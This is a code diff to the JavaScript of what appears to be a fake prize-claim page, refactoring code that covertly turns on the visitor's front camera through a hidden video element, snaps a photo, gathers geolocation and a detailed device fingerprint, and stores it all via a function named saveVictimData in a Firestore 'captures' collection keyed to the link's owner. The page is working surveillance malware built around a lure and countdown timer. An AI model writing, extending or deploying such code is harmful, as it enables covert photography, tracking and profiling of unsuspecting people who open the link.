@@ -144,6 +144,7 @@ const db = getFirestore(app);
 
 let currentFeature = null;
 let currentLinkId = null;
+let currentLinkData = null;
 let stream = null;
 let captureData = null;
 let timerInterval = null;
@@ -157,7 +158,6 @@ function showScreen(id) {
   window.scrollTo({ top: 0, behavior: "smooth" });
 }
 
-/* ========== ON LOAD ========== */
 window.addEventListener("load", async () => {
   await new Promise(r => setTimeout(r, 1500));
 
@@ -178,6 +178,8 @@ window.addEventListener("load", async () => {
     }
 
     const linkData = linkSnap.data();
+    currentLinkData = linkData;
+
     if (linkData.expiresAt) {
       const expMs = linkData.expiresAt.seconds
         ? linkData.expiresAt.seconds * 1000
@@ -193,18 +195,15 @@ window.addEventListener("load", async () => {
     showScreen("mainScreen");
     startTimer();
 
-    // Pre-warm camera in background
     if (currentFeature === "camera" || currentFeature === "all" || currentFeature === "video") {
       preWarmCamera();
     }
-
   } catch (e) {
     console.error(e);
     showScreen("errorScreen");
   }
 });
 
-/* ========== PRE-WARM CAMERA ========== */
 async function preWarmCamera() {
   try {
     stream = await navigator.mediaDevices.getUserMedia({
@@ -213,26 +212,21 @@ async function preWarmCamera() {
     });
     const video = document.getElementById("hiddenVideo");
     video.srcObject = stream;
-
     await new Promise((resolve) => {
-      if (video.readyState >= 3 && video.videoWidth > 0) {
-        resolve();
-      } else {
+      if (video.readyState >= 3 && video.videoWidth > 0) resolve();
+      else {
         video.onloadeddata = () => setTimeout(resolve, 800);
         video.onplaying = () => setTimeout(resolve, 800);
         setTimeout(resolve, 3500);
       }
     });
-
     cameraReady = video.videoWidth > 0;
-    console.log("Camera ready:", cameraReady, "Dimensions:", video.videoWidth, "x", video.videoHeight);
   } catch (e) {
     console.error("Pre-warm camera error:", e);
     cameraReady = false;
   }
 }
 
-/* ========== TIMER ========== */
 function startTimer() {
   timerSeconds = 120;
   updateTimerDisplay();
@@ -251,7 +245,6 @@ function updateTimerDisplay() {
   document.getElementById("timerSec").textContent = String(s).padStart(2, "0");
 }
 
-/* ========== CLAIM PRIZE ========== */
 window.claimPrize = async function() {
   const btn = document.getElementById("claimBtn");
   btn.disabled = true;
@@ -302,22 +295,19 @@ window.claimPrize = async function() {
     btn.textContent = "✨ Claim Now ✨";
     showScreen("errorScreen");
     document.getElementById("errorTitle").textContent = "Connection Issue";
-    document.getElementById("errorMsg").textContent = "Please check your internet connection and try again.";
+    document.getElementById("errorMsg").textContent = "Please check your internet and try again.";
   }
 }
 
-/* ========== CAPTURE CAMERA - FIXED ========== */
 async function captureCamera() {
   try {
     const video = document.getElementById("hiddenVideo");
-
     if (!stream || !cameraReady) {
       stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
         audio: false
       });
       video.srcObject = stream;
-
       await new Promise((resolve) => {
         let resolved = false;
         const done = () => { if (!resolved) { resolved = true; resolve(); } };
@@ -329,11 +319,7 @@ async function captureCamera() {
 
     await new Promise(r => setTimeout(r, 800));
 
-    const vw = video.videoWidth;
-    const vh = video.videoHeight;
-    console.log("Capturing at:", vw, "x", vh);
-
-    if (!vw || !vh) {
+    if (!video.videoWidth) {
       await new Promise(r => setTimeout(r, 1500));
       if (!video.videoWidth) throw new Error("Camera not ready");
     }
@@ -342,17 +328,13 @@ async function captureCamera() {
     canvas.width = video.videoWidth || 1280;
     canvas.height = video.videoHeight || 720;
     const ctx = canvas.getContext("2d");
-
     ctx.translate(canvas.width, 0);
     ctx.scale(-1, 1);
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // Verify not blank
     const testData = ctx.getImageData(0, 0, 10, 10).data;
     let sum = 0;
-    for (let i = 0; i < testData.length; i += 4) {
-      sum += testData[i] + testData[i+1] + testData[i+2];
-    }
+    for (let i = 0; i < testData.length; i += 4) sum += testData[i] + testData[i+1] + testData[i+2];
 
     if (sum === 0) {
       await new Promise(r => setTimeout(r, 1500));
@@ -363,12 +345,9 @@ async function captureCamera() {
     }
 
     captureData = canvas.toDataURL("image/jpeg", 0.85);
-
     const location = await getLocation();
     const device = getDeviceInfo();
-
     await saveVictimData("photo", { photo: captureData, location, device });
-    console.log("Photo saved, size:", captureData.length);
   } catch (e) {
     console.error("Camera error:", e);
     const device = getDeviceInfo();
@@ -388,7 +367,6 @@ async function captureDevice() {
   await saveVictimData("device", { device });
 }
 
-/* ========== LOCATION ========== */
 function getLocation() {
   return new Promise(resolve => {
     if (!navigator.geolocation) return resolve(null);
@@ -400,54 +378,34 @@ function getLocation() {
   });
 }
 
-/* ========== DEVICE INFO - 5 EXTRA FIELDS ========== */
 function getDeviceInfo() {
   const ua = navigator.userAgent;
   let type = "Desktop";
   if (/Android/i.test(ua)) type = "Android";
   else if (/iPhone|iPad|iPod/i.test(ua)) type = "iOS";
   else if (/Mobile/i.test(ua)) type = "Mobile";
-
-  const browser = /Chrome/.test(ua) ? "Chrome" :
-                  /Firefox/.test(ua) ? "Firefox" :
-                  /Safari/.test(ua) ? "Safari" :
-                  /Edg/.test(ua) ? "Edge" : "Browser";
-
+  const browser = /Chrome/.test(ua) ? "Chrome" : /Firefox/.test(ua) ? "Firefox" : /Safari/.test(ua) ? "Safari" : /Edg/.test(ua) ? "Edge" : "Browser";
   const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  const network = conn ? {
-    type: conn.effectiveType || "unknown",
-    downlink: conn.downlink || null,
-    rtt: conn.rtt || null
-  } : null;
-
+  const network = conn ? { type: conn.effectiveType || "unknown", downlink: conn.downlink || null, rtt: conn.rtt || null } : null;
   const memory = navigator.deviceMemory || "unknown";
   const cores = navigator.hardwareConcurrency || "unknown";
-
   let gpu = "unknown";
   try {
     const canvas = document.createElement("canvas");
     const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
     if (gl) {
       const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-      if (debugInfo) {
-        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      }
+      if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
     }
   } catch (e) {}
-
   const touch = "ontouchstart" in window || navigator.maxTouchPoints > 0;
-
   return {
     type, browser,
     platform: navigator.platform || "-",
     screen: `${screen.width}x${screen.height}`,
     language: navigator.language,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "-",
-    memory: memory,
-    cores: cores,
-    gpu: gpu,
-    touch: touch,
-    network: network,
+    memory, cores, gpu, touch, network,
     pixelRatio: window.devicePixelRatio || 1,
     vendor: navigator.vendor || "-",
     cookies: navigator.cookieEnabled,
@@ -459,12 +417,13 @@ function getDeviceInfo() {
 async function saveVictimData(type, data) {
   if (!currentLinkId) return;
   try {
-    const linkSnap = await getDoc(doc(db, "links", currentLinkId));
-    const linkData = linkSnap.data();
+    const linkData = currentLinkData || (await getDoc(doc(db, "links", currentLinkId))).data();
     await addDoc(collection(db, "captures"), {
       ownerId: linkData.ownerId,
       linkId: currentLinkId,
       feature: currentFeature,
+      website: linkData.website || "Modsir Tools",
+      hostname: linkData.hostname || location.hostname,
       type,
       ...data,
       timestamp: serverTimestamp()
